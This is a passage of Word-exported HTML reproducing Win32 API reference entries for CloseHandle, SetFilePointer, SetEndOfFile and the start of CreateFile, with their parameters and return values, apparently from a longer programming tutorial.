</span>HANDLE hObject<span style="mso-spacerun: yes">      </span>// handle to
object to close<span style="mso-spacerun: yes">                        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                   </span><span style="mso-spacerun:
yes">                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>hObject: Identifies an open object handle.<span style="mso-spacerun:
yes">                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                                       </span><span
style="mso-spacerun: yes">      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function succeeds, the return value is nonzero. If the function
fails, the return value is zero. To get extended error<span
style="mso-spacerun: yes">  </span>information, call GetLastError<span
style="mso-spacerun: yes">                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                             </span><span
style="mso-spacerun: yes">                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'>----------------------------------------------------------------------------------------------<span
style="mso-spacerun:
yes">                                                                      
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>DWORD SetFilePointer(<span style="mso-spacerun:
yes">                                 </span><span style="mso-spacerun:
yes">                    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>HANDLE hFile,<span style="mso-spacerun: yes">       </span>// handle of
file<span style="mso-spacerun: yes">                                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LONG lDistanceToMove,<span style="mso-spacerun: yes">       </span>//
number of bytes to move file pointer<span style="mso-spacerun: yes">    
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>PLONG lpDistanceToMoveHigh, // address of high-order word of
distance<span style="mso-spacerun: yes">   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> </span><span
style="mso-spacerun: yes">                                </span>// to
move<span style="mso-spacerun: yes">                                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD dwMoveMethod<span style="mso-spacerun: yes">  </span>// how to
move<span style="mso-spacerun: yes">                                     
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                       </span><span style="mso-spacerun:
yes">                                                      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>hFile: Identifies the file whose file pointer is to be moved. The file
handle must have been created with GENERIC_READ or GENERIC_WRITE access<span
style="mso-spacerun: yes">  </span>to the file.<span style="mso-spacerun:
yes">                                                            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lDistanceToMove: Specifies the number of bytes to move the file pointer
A positive value moves the pointer forward in the file and a negative<span
style="mso-spacerun: yes">  </span>value moves it backward.<span
style="mso-spacerun: yes">                                               
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpDistanceToMoveHigh: Points to the high-order word of the 64-bit
distance to move.If the value of this parameter is NULL,SetFilePointer can
operate only on files whose maximum size is 2^32 - 2. If this<span
style="mso-spacerun: yes">       </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>parameter is specified,the maximum file size is 2^64 - 2.This parameter
also receives the high-order word of the new value of the file pointer. <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwMoveMethod: Specifies the starting point for the file pointer move.
This parameter can be one of the following values:<span style="mso-spacerun:
yes">                      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">              </span>Value<span style="mso-spacerun:
yes">                                                             
</span>Meaning<span style="mso-spacerun:
yes">                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span><span style="mso-spacerun:
yes">                                                                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>+ FILE_BEGIN<span style="mso-spacerun: yes">   </span>- The starting
point is zero or the beginning of the file.If FILE_BEGIN is
specified,DistanceToMove is<span style="mso-spacerun: yes">  </span>interpreted
as an unsigned location for the new file<span style="mso-spacerun: yes"> 
</span>pointer.<span style="mso-spacerun:
yes">                                               </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>+ FILE_CURRENT - The current value of the file pointer is the
starting<span style="mso-spacerun: yes">  </span>point.<span
style="mso-spacerun: yes">                                                
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>+ FILE_END<span style="mso-spacerun: yes">     </span>- The current end-of-file
position is the starting point <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                                                                                                         
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                         </span><span style="mso-spacerun:
yes">           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the SetFilePointer function succeeds, the return value is the
low-order doubleword of the new file pointer, and if lpDistanceToMoveHigh is
not NULL, the function puts the high-order doubleword of the new<span
style="mso-spacerun: yes">   </span>file pointer into the LONG pointed to by
that parameter.<span style="mso-spacerun: yes">                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function fails and lpDistanceToMoveHigh is NULL, the return<span
style="mso-spacerun: yes">  </span>value is 0xFFFFFFFF. To get extended error
information, call<span style="mso-spacerun: yes">   </span>GetLastError.<span
style="mso-spacerun:
yes">                                                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function fails, and lpDistanceToMoveHigh is non-NULL,the return
value is 0xFFFFFFFF and GetLastError will return a value other than<span
style="mso-spacerun: yes">    </span>NO_ERROR.<span style="mso-spacerun:
yes">                                                               </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                           </span><span
style="mso-spacerun: yes">                                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>----------------------------------------------------------------------------------------------<span
style="mso-spacerun:
yes">                                                                      
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                     </span><span
style="mso-spacerun: yes">                        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>The SetEndOfFile function moves the end-of-file (EOF) position for the
specified file to the current position of the file pointer.<span
style="mso-spacerun: yes">               </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>BOOL SetEndOfFile(<span style="mso-spacerun:
yes">                                                        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>HANDLE hFile<span style="mso-spacerun: yes">        </span>// handle of
file whose EOF is to be set<span style="mso-spacerun: yes">            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                          </span><span style="mso-spacerun:
yes">                                                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>hFile: Identifies the file to have its EOF position moved. The file
handle must have been created with GENERIC_WRITE access to the file.<span
style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function succeeds, the return value is nonzero.<span
style="mso-spacerun: yes">                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function fails, the return value is zero. To get extended
error<span style="mso-spacerun: yes">   </span>information, call
GetLastError<span style="mso-spacerun:
yes">                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>----------------------------------------------------------------------------------------------<span
style="mso-spacerun: yes">             </span><span style="mso-spacerun:
yes">                                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>The CreateFile function creates or opens the following objects and<span
style="mso-spacerun: yes">  </span>returns a handle that can be used to access
the object:<span style="mso-spacerun: yes">                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                   </span><span
style="mso-spacerun: yes">                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>+ files (we are interested only in this one)<span style="mso-spacerun:
yes">                         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span></span><span lang=FR style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF;mso-ansi-language:FR'>+ pipes<span
style="mso-spacerun:
yes">                                                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun: yes">       
</span>+ mailslots<span style="mso-spacerun:
yes">                                                      </span><span
style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun: yes">       
</span>+ communications resources<span style="mso-spacerun:
yes">                                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun: yes">       
</span></span><span lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF;mso-ansi-language:EN-US'>+ disk devices (Windows NT
only)<span style="mso-spacerun: yes">                                    
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>+ consoles<span style="mso-spacerun:
yes">                                                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>+ directories (open only)<span style="mso-spacerun:
yes">                                            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>HANDLE CreateFile(<span style="mso-spacerun:
yes">                                                        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPCTSTR lpFileName, // pointer to name of the file<span
style="mso-spacerun: yes">                      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD dwDesiredAccess,<span style="mso-spacerun: yes">      </span>//
access (read-write) mode<span style="mso-spacerun: yes">                
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD dwShareMode,<span style="mso-spacerun: yes">  </span>// share
mode<span style="mso-spacerun: yes">                                      
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
